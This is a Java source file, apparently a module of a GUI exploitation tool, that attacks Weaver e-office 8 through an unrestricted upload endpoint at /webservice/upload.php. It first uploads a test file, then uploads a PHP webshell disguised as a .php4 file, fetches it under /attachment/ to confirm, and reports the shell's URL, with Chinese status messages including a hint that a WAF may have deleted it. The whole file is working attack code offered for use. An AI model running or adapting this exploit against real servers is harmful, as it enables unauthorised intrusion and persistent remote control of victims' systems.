package exp.oa.weaveroa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

import java.util.HashMap;

public class weaveroa_eoffice8_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean pay1 = pay1(url, textArea);
        return pay1;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Boolean shell = shell(url, textArea);
        return shell;
    }

    private Boolean pay1(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryCRMgP7QyN0VotswZ");
        String upload = "------WebKitFormBoundaryCRMgP7QyN0VotswZ\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"nishizhu.php4\"\n" +
                "Content-Type: application/octet-stream\n" +
                "\n" +
                shell.readFile(shell.Testpath) + "\n" +
                "------WebKitFormBoundaryCRMgP7QyN0VotswZ--";

        Response post = HttpTools.post(url + "/webservice/upload.php", upload, head, "utf-8");


        try {
            String uri1 = post.getText().split("\\*")[0];
            String uri2 = post.getText().split("\\*")[1];


            String geturl = url + "/attachment/" + uri1 + "/" + uri2;
            Response response = HttpTools.get(geturl, new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText(
                            "\n 漏洞存在 测试文件写入成功 \n " + geturl
                    );
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText(
                            "\n weaveroa-eoffice8-upload-RCE - 漏洞不存在 (出现误报请联系作者)"
                    );
                });
                return false;
            }
        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n weaveroa-eoffice8-upload-RCE - 漏洞不存在 (出现误报请联系作者)"
                );
            });
            return false;
        }


    }

    private Boolean shell(String url, TextArea textArea) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryCRMgP7QyN0VotswZ");
        String upload = "------WebKitFormBoundaryCRMgP7QyN0VotswZ\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"nishizhuda.php4\"\n" +
                "Content-Type: application/octet-stream\n" +
                "\n" +
                shell.readFile(shell.Phppath) + "\n" +
                "------WebKitFormBoundaryCRMgP7QyN0VotswZ--";

        Response post = HttpTools.post(url + "/webservice/upload.php", upload, head, "utf-8");

        String uri1 = post.getText().split("\\*")[0];
        String uri2 = post.getText().split("\\*")[1];

        String geturl = url + "/attachment/" + uri1 + "/" + uri2;
        Response response = HttpTools.get(geturl, new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n 漏洞存在 shell文件写入成功 \n " + geturl
                );
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n 疑似waf查杀，请手动测试"
                );
            });
            return false;
        }
    }


}
